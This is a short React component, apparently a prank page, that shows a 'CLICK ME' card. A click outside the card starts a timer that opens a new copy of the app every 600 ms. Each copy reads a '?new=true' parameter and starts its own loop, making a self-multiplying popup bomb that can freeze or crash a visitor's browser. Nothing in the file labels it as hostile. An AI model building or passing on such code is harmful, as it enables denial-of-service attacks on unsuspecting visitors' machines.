import { ElementRef, useEffect, useRef } from "react";
import "./App.css";
import { useClickOutside } from "./useClickOutside";
import { useSearchParams } from "react-router-dom";

function grow() {
  setInterval(() => {
    window.open(`${import.meta.env.BASE_URL}?new=true`);
  }, 600);
}

function App() {
  const [params] = useSearchParams();

  const dRef = useRef<ElementRef<"div">>(null);

  useEffect(() => {
    if (params.has("new")) {
      grow();
    }
  }, [params]);

  useClickOutside(dRef, () => grow());

  return (
    <div ref={dRef} className="card">
      CLICK ME
    </div>
  );
}

export default App;
